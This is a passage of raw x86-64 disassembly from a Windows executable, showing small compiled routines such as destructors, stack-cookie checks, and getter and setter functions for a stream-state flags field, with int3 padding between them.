   1400022ae:	48 85 c9             	test   %rcx,%rcx
   1400022b1:	74 05                	je     0x1400022b8
   1400022b3:	e8 50 03 0e 00       	call   0x1400e2608
   1400022b8:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   1400022bc:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   1400022c0:	48 85 c9             	test   %rcx,%rcx
   1400022c3:	74 05                	je     0x1400022ca
   1400022c5:	e8 3e 03 0e 00       	call   0x1400e2608
   1400022ca:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   1400022ce:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   1400022d2:	48 85 c9             	test   %rcx,%rcx
   1400022d5:	74 05                	je     0x1400022dc
   1400022d7:	e8 2c 03 0e 00       	call   0x1400e2608
   1400022dc:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   1400022e0:	48 8b 4d df          	mov    -0x21(%rbp),%rcx
   1400022e4:	48 85 c9             	test   %rcx,%rcx
   1400022e7:	74 05                	je     0x1400022ee
   1400022e9:	e8 1a 03 0e 00       	call   0x1400e2608
   1400022ee:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   1400022f2:	48 8b 4d cf          	mov    -0x31(%rbp),%rcx
   1400022f6:	48 85 c9             	test   %rcx,%rcx
   1400022f9:	74 05                	je     0x140002300
   1400022fb:	e8 08 03 0e 00       	call   0x1400e2608
   140002300:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   140002304:	48 8b 4d bf          	mov    -0x41(%rbp),%rcx
   140002308:	48 85 c9             	test   %rcx,%rcx
   14000230b:	74 05                	je     0x140002312
   14000230d:	e8 f6 02 0e 00       	call   0x1400e2608
   140002312:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   140002316:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   14000231a:	e8 35 b5 08 00       	call   0x14008d854
   14000231f:	90                   	nop
   140002320:	b8 02 00 00 00       	mov    $0x2,%eax
   140002325:	4c 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%r11
   14000232c:	00 
   14000232d:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140002331:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140002335:	49 8b e3             	mov    %r11,%rsp
   140002338:	41 5e                	pop    %r14
   14000233a:	5f                   	pop    %rdi
   14000233b:	5d                   	pop    %rbp
   14000233c:	c3                   	ret
   14000233d:	48 8d 0d 0c c4 12 00 	lea    0x12c40c(%rip),%rcx        # 0x14012e750
   140002344:	e8 3b bc 08 00       	call   0x14008df84
   140002349:	cc                   	int3
   14000234a:	cc                   	int3
   14000234b:	cc                   	int3
   14000234c:	cc                   	int3
   14000234d:	cc                   	int3
   14000234e:	cc                   	int3
   14000234f:	cc                   	int3
   140002350:	40 53                	rex push %rbx
   140002352:	48 83 ec 20          	sub    $0x20,%rsp
   140002356:	48 8d 05 73 d0 11 00 	lea    0x11d073(%rip),%rax        # 0x14011f3d0
   14000235d:	48 8b d9             	mov    %rcx,%rbx
   140002360:	48 89 01             	mov    %rax,(%rcx)
   140002363:	8b 41 20             	mov    0x20(%rcx),%eax
   140002366:	85 c0                	test   %eax,%eax
   140002368:	7e 0b                	jle    0x140002375
   14000236a:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   14000236e:	e8 95 02 0e 00       	call   0x1400e2608
   140002373:	eb 0b                	jmp    0x140002380
   140002375:	79 09                	jns    0x140002380
   140002377:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   14000237b:	e8 10 c0 0b 00       	call   0x1400be390
   140002380:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140002384:	e8 7f 02 0e 00       	call   0x1400e2608
   140002389:	48 8d 05 f0 bf 11 00 	lea    0x11bff0(%rip),%rax        # 0x14011e380
   140002390:	48 89 03             	mov    %rax,(%rbx)
   140002393:	48 83 c4 20          	add    $0x20,%rsp
   140002397:	5b                   	pop    %rbx
   140002398:	c3                   	ret
   140002399:	cc                   	int3
   14000239a:	cc                   	int3
   14000239b:	cc                   	int3
   14000239c:	cc                   	int3
   14000239d:	cc                   	int3
   14000239e:	cc                   	int3
   14000239f:	cc                   	int3
   1400023a0:	40 53                	rex push %rbx
   1400023a2:	48 83 ec 40          	sub    $0x40,%rsp
   1400023a6:	48 8b d9             	mov    %rcx,%rbx
   1400023a9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400023ae:	e8 fd c5 08 00       	call   0x14008e9b0
   1400023b3:	0f 10 00             	movups (%rax),%xmm0
   1400023b6:	0f 11 43 10          	movups %xmm0,0x10(%rbx)
   1400023ba:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400023be:	0f 11 4b 20          	movups %xmm1,0x20(%rbx)
   1400023c2:	48 83 c4 40          	add    $0x40,%rsp
   1400023c6:	5b                   	pop    %rbx
   1400023c7:	c3                   	ret
   1400023c8:	cc                   	int3
   1400023c9:	cc                   	int3
   1400023ca:	cc                   	int3
   1400023cb:	cc                   	int3
   1400023cc:	cc                   	int3
   1400023cd:	cc                   	int3
   1400023ce:	cc                   	int3
   1400023cf:	cc                   	int3
   1400023d0:	40 53                	rex push %rbx
   1400023d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400023d6:	8b 41 20             	mov    0x20(%rcx),%eax
   1400023d9:	48 8b d9             	mov    %rcx,%rbx
   1400023dc:	85 c0                	test   %eax,%eax
   1400023de:	7e 17                	jle    0x1400023f7
   1400023e0:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   1400023e4:	e8 1f 02 0e 00       	call   0x1400e2608
   1400023e9:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   1400023ed:	48 83 c4 20          	add    $0x20,%rsp
   1400023f1:	5b                   	pop    %rbx
   1400023f2:	e9 11 02 0e 00       	jmp    0x1400e2608
   1400023f7:	79 09                	jns    0x140002402
   1400023f9:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   1400023fd:	e8 8e bf 0b 00       	call   0x1400be390
   140002402:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140002406:	48 83 c4 20          	add    $0x20,%rsp
   14000240a:	5b                   	pop    %rbx
   14000240b:	e9 f8 01 0e 00       	jmp    0x1400e2608
   140002410:	0f b6 c2             	movzbl %dl,%eax
   140002413:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   140002417:	8b c8                	mov    %eax,%ecx
   140002419:	e9 52 c6 08 00       	jmp    0x14008ea70
   14000241e:	cc                   	int3
   14000241f:	cc                   	int3
   140002420:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002425:	57                   	push   %rdi
   140002426:	48 83 ec 20          	sub    $0x20,%rsp
   14000242a:	49 8b f8             	mov    %r8,%rdi
   14000242d:	48 8b da             	mov    %rdx,%rbx
   140002430:	49 3b d0             	cmp    %r8,%rdx
   140002433:	74 25                	je     0x14000245a
   140002435:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000243a:	48 8d 71 10          	lea    0x10(%rcx),%rsi
   14000243e:	66 90                	xchg   %ax,%ax
   140002440:	0f b6 0b             	movzbl (%rbx),%ecx
   140002443:	48 8b d6             	mov    %rsi,%rdx
   140002446:	e8 25 c6 08 00       	call   0x14008ea70
   14000244b:	88 03                	mov    %al,(%rbx)
   14000244d:	48 ff c3             	inc    %rbx
   140002450:	48 3b df             	cmp    %rdi,%rbx
   140002453:	75 eb                	jne    0x140002440
   140002455:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   14000245a:	48 8b c3             	mov    %rbx,%rax
   14000245d:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140002462:	48 83 c4 20          	add    $0x20,%rsp
   140002466:	5f                   	pop    %rdi
   140002467:	c3                   	ret
   140002468:	cc                   	int3
   140002469:	cc                   	int3
   14000246a:	cc                   	int3
   14000246b:	cc                   	int3
   14000246c:	cc                   	int3
   14000246d:	cc                   	int3
   14000246e:	cc                   	int3
   14000246f:	cc                   	int3
   140002470:	0f b6 c2             	movzbl %dl,%eax
   140002473:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   140002477:	8b c8                	mov    %eax,%ecx
   140002479:	e9 42 c8 08 00       	jmp    0x14008ecc0
   14000247e:	cc                   	int3
   14000247f:	cc                   	int3
   140002480:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002485:	57                   	push   %rdi
   140002486:	48 83 ec 20          	sub    $0x20,%rsp
   14000248a:	49 8b f8             	mov    %r8,%rdi
   14000248d:	48 8b da             	mov    %rdx,%rbx
   140002490:	49 3b d0             	cmp    %r8,%rdx
   140002493:	74 25                	je     0x1400024ba
   140002495:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000249a:	48 8d 71 10          	lea    0x10(%rcx),%rsi
   14000249e:	66 90                	xchg   %ax,%ax
   1400024a0:	0f b6 0b             	movzbl (%rbx),%ecx
   1400024a3:	48 8b d6             	mov    %rsi,%rdx
   1400024a6:	e8 15 c8 08 00       	call   0x14008ecc0
   1400024ab:	88 03                	mov    %al,(%rbx)
   1400024ad:	48 ff c3             	inc    %rbx
   1400024b0:	48 3b df             	cmp    %rdi,%rbx
   1400024b3:	75 eb                	jne    0x1400024a0
   1400024b5:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   1400024ba:	48 8b c3             	mov    %rbx,%rax
   1400024bd:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400024c2:	48 83 c4 20          	add    $0x20,%rsp
   1400024c6:	5f                   	pop    %rdi
   1400024c7:	c3                   	ret
   1400024c8:	cc                   	int3
   1400024c9:	cc                   	int3
   1400024ca:	cc                   	int3
   1400024cb:	cc                   	int3
   1400024cc:	cc                   	int3
   1400024cd:	cc                   	int3
   1400024ce:	cc                   	int3
   1400024cf:	cc                   	int3
   1400024d0:	0f b6 c2             	movzbl %dl,%eax
   1400024d3:	c3                   	ret
   1400024d4:	cc                   	int3
   1400024d5:	cc                   	int3
   1400024d6:	cc                   	int3
   1400024d7:	cc                   	int3
   1400024d8:	cc                   	int3
   1400024d9:	cc                   	int3
   1400024da:	cc                   	int3
   1400024db:	cc                   	int3
   1400024dc:	cc                   	int3
   1400024dd:	cc                   	int3
   1400024de:	cc                   	int3
   1400024df:	cc                   	int3
   1400024e0:	40 53                	rex push %rbx
   1400024e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400024e6:	49 8b d8             	mov    %r8,%rbx
   1400024e9:	49 8b c9             	mov    %r9,%rcx
   1400024ec:	4c 2b c2             	sub    %rdx,%r8
   1400024ef:	e8 5c eb 0b 00       	call   0x1400c1050
   1400024f4:	48 8b c3             	mov    %rbx,%rax
   1400024f7:	48 83 c4 20          	add    $0x20,%rsp
   1400024fb:	5b                   	pop    %rbx
   1400024fc:	c3                   	ret
   1400024fd:	cc                   	int3
   1400024fe:	cc                   	int3
   1400024ff:	cc                   	int3
   140002500:	40 53                	rex push %rbx
   140002502:	48 83 ec 20          	sub    $0x20,%rsp
   140002506:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000250b:	49 8b d8             	mov    %r8,%rbx
   14000250e:	4c 2b c2             	sub    %rdx,%r8
   140002511:	e8 3a eb 0b 00       	call   0x1400c1050
   140002516:	48 8b c3             	mov    %rbx,%rax
   140002519:	48 83 c4 20          	add    $0x20,%rsp
   14000251d:	5b                   	pop    %rbx
   14000251e:	c3                   	ret
   14000251f:	cc                   	int3
   140002520:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002525:	57                   	push   %rdi
   140002526:	48 83 ec 20          	sub    $0x20,%rsp
   14000252a:	48 8d 05 9f ce 11 00 	lea    0x11ce9f(%rip),%rax        # 0x14011f3d0
   140002531:	8b fa                	mov    %edx,%edi
   140002533:	48 89 01             	mov    %rax,(%rcx)
   140002536:	48 8b d9             	mov    %rcx,%rbx
   140002539:	8b 41 20             	mov    0x20(%rcx),%eax
   14000253c:	85 c0                	test   %eax,%eax
   14000253e:	7e 0b                	jle    0x14000254b
   140002540:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140002544:	e8 bf 00 0e 00       	call   0x1400e2608
   140002549:	eb 0b                	jmp    0x140002556
   14000254b:	79 09                	jns    0x140002556
   14000254d:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140002551:	e8 3a be 0b 00       	call   0x1400be390
   140002556:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000255a:	e8 a9 00 0e 00       	call   0x1400e2608
   14000255f:	48 8d 05 1a be 11 00 	lea    0x11be1a(%rip),%rax        # 0x14011e380
   140002566:	48 89 03             	mov    %rax,(%rbx)
   140002569:	40 f6 c7 01          	test   $0x1,%dil
   14000256d:	74 0d                	je     0x14000257c
   14000256f:	ba 30 00 00 00       	mov    $0x30,%edx
   140002574:	48 8b cb             	mov    %rbx,%rcx
   140002577:	e8 14 be 0b 00       	call   0x1400be390
   14000257c:	48 8b c3             	mov    %rbx,%rax
   14000257f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002584:	48 83 c4 20          	add    $0x20,%rsp
   140002588:	5f                   	pop    %rdi
   140002589:	c3                   	ret
   14000258a:	cc                   	int3
   14000258b:	cc                   	int3
   14000258c:	cc                   	int3
   14000258d:	cc                   	int3
   14000258e:	cc                   	int3
   14000258f:	cc                   	int3
   140002590:	40 53                	rex push %rbx
   140002592:	48 83 ec 70          	sub    $0x70,%rsp
   140002596:	0f 29 74 24 60       	movaps %xmm6,0x60(%rsp)
   14000259b:	48 8b 05 9e 0a 14 00 	mov    0x140a9e(%rip),%rax        # 0x140143040
   1400025a2:	48 33 c4             	xor    %rsp,%rax
   1400025a5:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400025aa:	48 8b d9             	mov    %rcx,%rbx
   1400025ad:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400025b2:	41 0f 10 30          	movups (%r8),%xmm6
   1400025b6:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400025b9:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400025be:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400025c1:	f3 0f 7f 4c 24 40    	movdqu %xmm1,0x40(%rsp)
   1400025c7:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   1400025ce:	66 90                	xchg   %ax,%ax
   1400025d0:	49 ff c0             	inc    %r8
   1400025d3:	42 80 3c 02 00       	cmpb   $0x0,(%rdx,%r8,1)
   1400025d8:	75 f6                	jne    0x1400025d0
   1400025da:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400025df:	e8 5c b6 00 00       	call   0x14000dc40
   1400025e4:	90                   	nop
   1400025e5:	66 0f 7f 74 24 20    	movdqa %xmm6,0x20(%rsp)
   1400025eb:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400025f0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400025f5:	48 8b cb             	mov    %rbx,%rcx
   1400025f8:	e8 73 f1 ff ff       	call   0x140001770
   1400025fd:	90                   	nop
   1400025fe:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002603:	48 83 fa 10          	cmp    $0x10,%rdx
   140002607:	72 2e                	jb     0x140002637
   140002609:	48 ff c2             	inc    %rdx
   14000260c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140002611:	48 8b c1             	mov    %rcx,%rax
   140002614:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000261b:	72 15                	jb     0x140002632
   14000261d:	48 83 c2 27          	add    $0x27,%rdx
   140002621:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002625:	48 2b c1             	sub    %rcx,%rax
   140002628:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   14000262c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002630:	77 2a                	ja     0x14000265c
   140002632:	e8 59 bd 0b 00       	call   0x1400be390
   140002637:	48 8d 05 2a d7 11 00 	lea    0x11d72a(%rip),%rax        # 0x14011fd68
   14000263e:	48 89 03             	mov    %rax,(%rbx)
   140002641:	48 8b c3             	mov    %rbx,%rax
   140002644:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140002649:	48 33 cc             	xor    %rsp,%rcx
   14000264c:	e8 1f bd 0b 00       	call   0x1400be370
   140002651:	0f 28 74 24 60       	movaps 0x60(%rsp),%xmm6
   140002656:	48 83 c4 70          	add    $0x70,%rsp
   14000265a:	5b                   	pop    %rbx
   14000265b:	c3                   	ret
   14000265c:	e8 5f 10 0e 00       	call   0x1400e36c0
   140002661:	cc                   	int3
   140002662:	cc                   	int3
   140002663:	cc                   	int3
   140002664:	cc                   	int3
   140002665:	cc                   	int3
   140002666:	cc                   	int3
   140002667:	cc                   	int3
   140002668:	cc                   	int3
   140002669:	cc                   	int3
   14000266a:	cc                   	int3
   14000266b:	cc                   	int3
   14000266c:	cc                   	int3
   14000266d:	cc                   	int3
   14000266e:	cc                   	int3
   14000266f:	cc                   	int3
   140002670:	f6 41 10 06          	testb  $0x6,0x10(%rcx)
   140002674:	0f 94 c0             	sete   %al
   140002677:	c3                   	ret
   140002678:	cc                   	int3
   140002679:	cc                   	int3
   14000267a:	cc                   	int3
   14000267b:	cc                   	int3
   14000267c:	cc                   	int3
   14000267d:	cc                   	int3
   14000267e:	cc                   	int3
   14000267f:	cc                   	int3
   140002680:	48 83 ec 68          	sub    $0x68,%rsp
   140002684:	83 e2 17             	and    $0x17,%edx
   140002687:	89 51 10             	mov    %edx,0x10(%rcx)
   14000268a:	23 51 14             	and    0x14(%rcx),%edx
   14000268d:	74 07                	je     0x140002696
   14000268f:	45 84 c0             	test   %r8b,%r8b
   140002692:	74 11                	je     0x1400026a5
   140002694:	eb 05                	jmp    0x14000269b
   140002696:	48 83 c4 68          	add    $0x68,%rsp
   14000269a:	c3                   	ret
   14000269b:	33 d2                	xor    %edx,%edx
   14000269d:	33 c9                	xor    %ecx,%ecx
   14000269f:	e8 d0 e8 0b 00       	call   0x1400c0f74
   1400026a4:	cc                   	int3
   1400026a5:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   1400026aa:	f6 c2 04             	test   $0x4,%dl
   1400026ad:	74 09                	je     0x1400026b8
   1400026af:	48 8d 1d ba c0 12 00 	lea    0x12c0ba(%rip),%rbx        # 0x14012e770
   1400026b6:	eb 15                	jmp    0x1400026cd
   1400026b8:	f6 c2 02             	test   $0x2,%dl
   1400026bb:	48 8d 1d c6 c0 12 00 	lea    0x12c0c6(%rip),%rbx        # 0x14012e788
   1400026c2:	48 8d 05 d7 c0 12 00 	lea    0x12c0d7(%rip),%rax        # 0x14012e7a0
   1400026c9:	48 0f 44 d8          	cmove  %rax,%rbx
   1400026cd:	ba 01 00 00 00       	mov    $0x1,%edx
   1400026d2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400026d7:	e8 54 ef ff ff       	call   0x140001630
   1400026dc:	4c 8b c0             	mov    %rax,%r8
   1400026df:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400026e4:	48 8b d3             	mov    %rbx,%rdx
   1400026e7:	e8 a4 fe ff ff       	call   0x140002590
   1400026ec:	48 8d 15 5d fa 13 00 	lea    0x13fa5d(%rip),%rdx        # 0x140142150
   1400026f3:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400026f8:	e8 77 e8 0b 00       	call   0x1400c0f74
   1400026fd:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140002702:	cc                   	int3
   140002703:	cc                   	int3
   140002704:	cc                   	int3
   140002705:	cc                   	int3
   140002706:	cc                   	int3
   140002707:	cc                   	int3
   140002708:	cc                   	int3
   140002709:	cc                   	int3
   14000270a:	cc                   	int3
   14000270b:	cc                   	int3
   14000270c:	cc                   	int3
   14000270d:	cc                   	int3
   14000270e:	cc                   	int3
   14000270f:	cc                   	int3
   140002710:	c7 41 10 00 00 00 00 	movl   $0x0,0x10(%rcx)
   140002717:	c3                   	ret
   140002718:	cc                   	int3
   140002719:	cc                   	int3
   14000271a:	cc                   	int3
   14000271b:	cc                   	int3
   14000271c:	cc                   	int3
   14000271d:	cc                   	int3
   14000271e:	cc                   	int3
   14000271f:	cc                   	int3
   140002720:	8b 41 10             	mov    0x10(%rcx),%eax
   140002723:	c3                   	ret
   140002724:	cc                   	int3
   140002725:	cc                   	int3
   140002726:	cc                   	int3
   140002727:	cc                   	int3
   140002728:	cc                   	int3
   140002729:	cc                   	int3
   14000272a:	cc                   	int3
   14000272b:	cc                   	int3
   14000272c:	cc                   	int3
   14000272d:	cc                   	int3
   14000272e:	cc                   	int3
   14000272f:	cc                   	int3
   140002730:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   140002734:	0f 94 c0             	sete   %al
   140002737:	c3                   	ret
   140002738:	cc                   	int3
   140002739:	cc                   	int3
   14000273a:	cc                   	int3
   14000273b:	cc                   	int3
   14000273c:	cc                   	int3
   14000273d:	cc                   	int3
   14000273e:	cc                   	int3
   14000273f:	cc                   	int3
   140002740:	f6 41 10 06          	testb  $0x6,0x10(%rcx)
   140002744:	0f 95 c0             	setne  %al
   140002747:	c3                   	ret
   140002748:	cc                   	int3
   140002749:	cc                   	int3
   14000274a:	cc                   	int3
   14000274b:	cc                   	int3
   14000274c:	cc                   	int3
   14000274d:	cc                   	int3
   14000274e:	cc                   	int3
   14000274f:	cc                   	int3
   140002750:	8b 41 18             	mov    0x18(%rcx),%eax
   140002753:	c3                   	ret
   140002754:	cc                   	int3
   140002755:	cc                   	int3
   140002756:	cc                   	int3
   140002757:	cc                   	int3
   140002758:	cc                   	int3
   140002759:	cc                   	int3
   14000275a:	cc                   	int3
   14000275b:	cc                   	int3
   14000275c:	cc                   	int3
   14000275d:	cc                   	int3
   14000275e:	cc                   	int3
   14000275f:	cc                   	int3
   140002760:	8b 41 18             	mov    0x18(%rcx),%eax
   140002763:	0f b7 d2             	movzwl %dx,%edx
   140002766:	0b d0                	or     %eax,%edx
   140002768:	89 51 18             	mov    %edx,0x18(%rcx)
   14000276b:	c3                   	ret
   14000276c:	cc                   	int3
   14000276d:	cc                   	int3
   14000276e:	cc                   	int3
   14000276f:	cc                   	int3
   140002770:	8b 41 18             	mov    0x18(%rcx),%eax
   140002773:	45 8b c8             	mov    %r8d,%r9d
   140002776:	41 f7 d1             	not    %r9d
   140002779:	41 23 d0             	and    %r8d,%edx
   14000277c:	44 23 c8             	and    %eax,%r9d
   14000277f:	0f b7 d2             	movzwl %dx,%edx
   140002782:	44 0b ca             	or     %edx,%r9d
   140002785:	44 89 49 18          	mov    %r9d,0x18(%rcx)
   140002789:	c3                   	ret
   14000278a:	cc                   	int3
   14000278b:	cc                   	int3
   14000278c:	cc                   	int3
   14000278d:	cc                   	int3
   14000278e:	cc                   	int3
   14000278f:	cc                   	int3
   140002790:	f7 d2                	not    %edx
   140002792:	21 51 18             	and    %edx,0x18(%rcx)
   140002795:	c3                   	ret
   140002796:	cc                   	int3
   140002797:	cc                   	int3
   140002798:	cc                   	int3
   140002799:	cc                   	int3
   14000279a:	cc                   	int3
   14000279b:	cc                   	int3
   14000279c:	cc                   	int3
   14000279d:	cc                   	int3
   14000279e:	cc                   	int3
   14000279f:	cc                   	int3
   1400027a0:	48 8b 41 20          	mov    0x20(%rcx),%rax
   1400027a4:	c3                   	ret
   1400027a5:	cc                   	int3
   1400027a6:	cc                   	int3
   1400027a7:	cc                   	int3
   1400027a8:	cc                   	int3
   1400027a9:	cc                   	int3
   1400027aa:	cc                   	int3
   1400027ab:	cc                   	int3
   1400027ac:	cc                   	int3
   1400027ad:	cc                   	int3
   1400027ae:	cc                   	int3
   1400027af:	cc                   	int3
   1400027b0:	48 8b 41 28          	mov    0x28(%rcx),%rax
   1400027b4:	c3                   	ret
   1400027b5:	cc                   	int3
   1400027b6:	cc                   	int3
   1400027b7:	cc                   	int3
   1400027b8:	cc                   	int3
   1400027b9:	cc                   	int3
   1400027ba:	cc                   	int3
   1400027bb:	cc                   	int3
   1400027bc:	cc                   	int3
   1400027bd:	cc                   	int3
   1400027be:	cc                   	int3
   1400027bf:	cc                   	int3
   1400027c0:	48 8b 41 28          	mov    0x28(%rcx),%rax
   1400027c4:	48 89 51 28          	mov    %rdx,0x28(%rcx)
   1400027c8:	c3                   	ret
   1400027c9:	cc                   	int3
   1400027ca:	cc                   	int3
   1400027cb:	cc                   	int3
   1400027cc:	cc                   	int3
   1400027cd:	cc                   	int3
   1400027ce:	cc                   	int3
   1400027cf:	cc                   	int3
   1400027d0:	40 53                	rex push %rbx
   1400027d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400027d6:	48 8b 41 40          	mov    0x40(%rcx),%rax
   1400027da:	48 8b da             	mov    %rdx,%rbx
   1400027dd:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400027e1:	48 89 4a 08          	mov    %rcx,0x8(%rdx)
   1400027e5:	48 8b 01             	mov    (%rcx),%rax
   1400027e8:	48 8b 40 08          	mov    0x8(%rax),%rax
   1400027ec:	ff 15 96 ab 11 00    	call   *0x11ab96(%rip)        # 0x14011d388
   1400027f2:	48 8b c3             	mov    %rbx,%rax
   1400027f5:	48 83 c4 20          	add    $0x20,%rsp
   1400027f9:	5b                   	pop    %rbx
   1400027fa:	c3                   	ret
   1400027fb:	cc                   	int3
   1400027fc:	cc                   	int3
   1400027fd:	cc                   	int3
   1400027fe:	cc                   	int3
   1400027ff:	cc                   	int3
   140002800:	48 83 ec 28          	sub    $0x28,%rsp
   140002804:	48 8d 05 e5 eb 12 00 	lea    0x12ebe5(%rip),%rax        # 0x1401313f0
   14000280b:	48 89 01             	mov    %rax,(%rcx)
   14000280e:	e8 29 bf 08 00       	call   0x14008e73c
   140002813:	90                   	nop
   140002814:	48 83 c4 28          	add    $0x28,%rsp
   140002818:	c3                   	ret
   140002819:	cc                   	int3
   14000281a:	cc                   	int3
   14000281b:	cc                   	int3
   14000281c:	cc                   	int3
   14000281d:	cc                   	int3
   14000281e:	cc                   	int3
   14000281f:	cc                   	int3
   140002820:	48 8d 05 c9 eb 12 00 	lea    0x12ebc9(%rip),%rax        # 0x1401313f0
   140002827:	48 89 01             	mov    %rax,(%rcx)
   14000282a:	33 c0                	xor    %eax,%eax
   14000282c:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140002830:	48 89 41 30          	mov    %rax,0x30(%rcx)
   140002834:	48 89 41 38          	mov    %rax,0x38(%rcx)
   140002838:	48 89 41 40          	mov    %rax,0x40(%rcx)
   14000283c:	48 8b c1             	mov    %rcx,%rax
   14000283f:	c3                   	ret
   140002840:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002845:	57                   	push   %rdi
   140002846:	48 83 ec 20          	sub    $0x20,%rsp
   14000284a:	48 8b f9             	mov    %rcx,%rdi
   14000284d:	33 c0                	xor    %eax,%eax
   14000284f:	48 89 41 40          	mov    %rax,0x40(%rcx)
   140002853:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140002857:	89 41 14             	mov    %eax,0x14(%rcx)
   14000285a:	c7 41 18 01 02 00 00 	movl   $0x201,0x18(%rcx)
   140002861:	48 c7 41 20 06 00 00 	movq   $0x6,0x20(%rcx)
   140002868:	00 
   140002869:	48 89 41 28          	mov    %rax,0x28(%rcx)
   14000286d:	48 89 41 30          	mov    %rax,0x30(%rcx)
   140002871:	48 89 41 38          	mov    %rax,0x38(%rcx)
   140002875:	89 41 10             	mov    %eax,0x10(%rcx)
   140002878:	8d 48 10             	lea    0x10(%rax),%ecx
   14000287b:	e8 18 bb 0b 00       	call   0x1400be398
   140002880:	48 8b d8             	mov    %rax,%rbx
   140002883:	b1 01                	mov    $0x1,%cl
   140002885:	e8 a2 ba 08 00       	call   0x14008e32c
   14000288a:	48 89 43 08          	mov    %rax,0x8(%rbx)
   14000288e:	48 89 5f 40          	mov    %rbx,0x40(%rdi)
   140002892:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002897:	48 83 c4 20          	add    $0x20,%rsp
   14000289b:	5f                   	pop    %rdi
   14000289c:	c3                   	ret
   14000289d:	cc                   	int3
   14000289e:	cc                   	int3
   14000289f:	cc                   	int3
   1400028a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400028a5:	57                   	push   %rdi
   1400028a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400028aa:	48 8b da             	mov    %rdx,%rbx
   1400028ad:	48 8d 05 34 b4 11 00 	lea    0x11b434(%rip),%rax        # 0x14011dce8
   1400028b4:	48 89 01             	mov    %rax,(%rcx)
   1400028b7:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   1400028bb:	48 8b f9             	mov    %rcx,%rdi
   1400028be:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400028c1:	0f 11 02             	movups %xmm0,(%rdx)
   1400028c4:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   1400028c8:	e8 bb e2 0b 00       	call   0x1400c0b88
   1400028cd:	48 8d 05 ec c9 11 00 	lea    0x11c9ec(%rip),%rax        # 0x14011f2c0
   1400028d4:	48 89 07             	mov    %rax,(%rdi)
   1400028d7:	48 8d 05 8a d4 11 00 	lea    0x11d48a(%rip),%rax        # 0x14011fd68
   1400028de:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   1400028e2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400028e7:	48 89 07             	mov    %rax,(%rdi)
   1400028ea:	48 8b c7             	mov    %rdi,%rax
   1400028ed:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   1400028f1:	48 83 c4 20          	add    $0x20,%rsp
   1400028f5:	5f                   	pop    %rdi
   1400028f6:	c3                   	ret
   1400028f7:	cc                   	int3
